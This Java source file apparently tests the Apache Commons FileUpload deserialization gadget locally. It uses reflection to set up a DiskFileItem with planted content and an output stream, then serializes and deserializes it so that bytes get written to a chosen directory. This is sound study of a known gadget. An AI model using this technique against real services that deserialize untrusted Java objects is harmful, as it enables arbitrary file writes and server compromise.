package FileUpload;

import common.*;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.fileupload.FileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;

import java.io.File;
import java.lang.reflect.Constructor;
import java.util.Arrays;

public class Main {
    public static void main(String[] args) throws Exception{
        System.out.println(Arrays.toString(DiskFileItem.class.getDeclaredConstructors()));
        DiskFileItem fileItem= (DiskFileItem) Reflections.newInstanceWithOnlyConstructor(DiskFileItem.class,
                "",
                "application/x-java-serialized-object",
                false,
                null,
                1,
                new File("D:\\code\\Java_Test\\src\\main\\java\\FileUpload"));
        Reflections.setFieldValue(fileItem, "cachedContent", "12345".getBytes("UTF-8"));
        Reflections.setFieldValue(fileItem, "dfos", new DeferredFileOutputStream(1024, null));
        byte[] ser=Util.serialize(fileItem);
        Util.deserialize(ser);
    }
}
